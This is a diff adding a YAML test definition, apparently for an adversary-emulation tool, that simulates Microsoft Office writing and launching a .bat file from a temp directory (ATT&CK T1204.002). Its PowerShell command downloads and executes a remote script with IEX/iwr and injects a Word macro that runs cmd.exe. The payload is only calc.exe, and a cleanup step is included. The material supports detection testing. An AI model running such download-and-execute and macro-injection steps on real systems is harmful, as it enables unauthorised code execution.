@@ -1,0 +1,24 @@
+---
+- id: 7056c67b753322231014ae123147a629
+  name: Office launching .bat file from AppData
+  description: Microsoft Office creating then launching a .bat script from an AppData
+    directory. The .bat file launches calc.exe when opened.
+  tactic: execution
+  technique:
+    attack_id: T1204.002
+    name: 'User Execution: Malicious File'
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing); $macrocode = "   Open `"$("$env:temp\art1204.bat")`"
+          For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe
+          /c $("$env:temp\art1204.bat") `", vbNormalFocus)`n"; Invoke-MalDoc -macroCode
+          $macrocode -officeProduct Word'
+        payloads: []
+        cleanup: Remove-Item $("$env:temp\art1204.bat") -ErrorAction Ignore; Get-Process
+          | Where-Object { $_.MainModule.FileName -like "*calculator*" } | Stop-Process
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
